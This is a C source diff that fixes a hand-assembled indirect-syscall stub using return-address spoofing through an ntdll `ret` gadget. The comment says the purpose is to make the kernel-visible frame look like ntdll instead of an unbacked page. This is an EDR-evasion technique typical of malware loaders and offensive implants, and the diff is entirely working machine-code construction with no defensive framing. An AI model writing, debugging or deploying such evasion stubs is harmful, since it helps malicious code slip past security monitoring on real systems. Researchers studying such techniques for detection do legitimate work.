@@ -218,22 +218,27 @@ static void * make_exec(sc_entry * e, int indirect) {
 		build_direct_stub(built, e->ssn);
 	}
 	else if (indirect && e->gadget) {
-		/* v2 RA spoof:
-		 *   mov r10, rcx; mov eax, SSN
+		/* v2 RA spoof (byte order matters!):
+		 *   mov r10, rcx
 		 *   mov rax, gadget+2 ; push rax     <- bare `ret` inside ntdll
+		 *   mov eax, SSN                     <- AFTER rax: the 64-bit load
+		 *                                      zeroes eax, loading it first
+		 *                                      shipped a garbage SSN (the
+		 *                                      low dword of the ntdll
+		 *                                      address - live fault=0x2a0)
 		 *   jmp [rip+0] -> gadget (syscall; ret)
 		 * syscall returns -> gadget ret pops the pushed ntdll ret ->
 		 * that ret pops the caller's real return address. The frame under
 		 * the kernel-visible syscall is ntdll, not this unbacked page. */
 		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
-		built[3] = 0xB8;
-		memcpy(built + 4, &e->ssn, 4);
-		built[8] = 0x48; built[9] = 0xB8; /* mov rax, imm64 */
+		built[3] = 0x48; built[4] = 0xB8; /* mov rax, imm64 */
 		{
 			unsigned long long r = (unsigned long long)(e->gadget + 2);
-			memcpy(built + 10, &r, 8);
+			memcpy(built + 5, &r, 8);
 		}
-		built[18] = 0x50; /* push rax */
+		built[13] = 0x50; /* push rax */
+		built[14] = 0xB8; /* mov eax, SSN */
+		memcpy(built + 15, &e->ssn, 4);
 		built[19] = 0xFF; built[20] = 0x25; /* jmp qword ptr [rip+0] */
 		memcpy(built + 25, &e->gadget, 8); /* bytes 25..32: 33-byte stub */
 	}
